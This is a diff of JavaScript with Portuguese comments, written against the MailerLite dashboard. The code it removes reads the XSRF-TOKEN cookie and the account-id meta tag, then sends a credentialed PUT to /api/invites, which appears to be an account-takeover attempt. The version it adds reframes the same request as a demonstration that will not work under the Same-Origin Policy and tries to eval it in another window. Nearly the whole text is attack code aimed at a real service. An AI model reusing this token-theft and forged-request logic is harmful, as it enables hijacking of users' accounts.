@@ -5,21 +5,41 @@ setTimeout(function() {
         }
 }, 3000);
 
-// Segundo timeout: após 6 segundos, só redireciona se não estiver com ?ato
+/*
+================================================================
+AVISO IMPORTANTE: 
+Este código NÃO VAI FUNCIONAR como esperado.
+Ele é apenas uma representação de como seria a sintaxe se os 
+navegadores não tivessem barreiras de segurança (Same-Origin Policy).
+A execução deste código irá gerar um erro de segurança no console.
+================================================================
+*/
+
+// Primeiro timeout: após 6 segundos, abre a nova janela
 setTimeout(function() {
     if (window.top.location.search == "?start") {
-        window.top.open("https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit?ato");
-    }
-}, 6000);
-
-// Na dashboard, com ?ato, executa o fetch após 4 segundos
-if (window.location.search === "?ato") {
-    setTimeout(function() {
-        try {
-            const xsrfToken = decodeURIComponent(window.top.document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
-            const accountId = window.top.document.querySelector('meta[name="account-id"]').getAttribute('content');
         
-            fetch('https://dashboard.mailerlite.com/api/invites', {
+        console.log("Abrindo a nova janela para o MailerLite...");
+        
+        // 1. Abre a nova janela e guarda uma referência a ela na variável 'novaJanela'
+        const novaJanela = window.top.open("https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit?ato");
+
+        // 2. Tenta verificar a URL da nova janela a partir da janela original
+        // !! ESTA PARTE VAI FALHAR E GERAR UM ERRO DE SEGURANÇA !!
+        try {
+            // A verificação é feita na variável 'novaJanela' que acabamos de criar.
+            // O navegador vai bloquear a leitura de 'novaJanela.location' aqui.
+            if (novaJanela && novaJanela.location.search.includes("?ato")) {
+                
+                // ESTE TRECHO NUNCA SERÁ EXECUTADO
+                console.log("Sucesso! A nova janela tem '?ato'. Agendando o fetch. (Esta mensagem nunca aparecerá)");
+                
+                // Se fosse possível, a lógica para executar o fetch na outra janela seria algo assim,
+                // mas isso também seria bloqueado por segurança.
+                novaJanela.eval(`
+                    setTimeout(function() {
+                        console.log('Executando o fetch na janela do MailerLite');
+                                    fetch('https://dashboard.mailerlite.com/api/invites', {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'application/json',
@@ -37,8 +57,19 @@ if (window.location.search === "?ato") {
                 }),
                 credentials: 'include'
             });
-        } catch(e) {
-            console.error("Erro ao executar o fetch:", e);
+                    }, 4000);
+                `);
+
+            } else {
+                 // ESTE TRECHO TAMBÉM NÃO SERÁ EXECUTADO, POIS O ERRO ACONTECE ANTES
+                 console.log("A URL da nova janela não pôde ser lida ou não contém '?ato'.");
+            }
+
+        } catch (e) {
+            // 3. O código vai pular diretamente para este bloco de erro.
+            console.error("ERRO CAPTURADO! O navegador bloqueou o acesso à nova janela como esperado.");
+            console.error("Isso demonstra a 'Same-Origin Policy' em ação.");
+            console.error("Detalhes do erro:", e);
         }
-    }, 7000);
-}
+    }
+}, 6000);
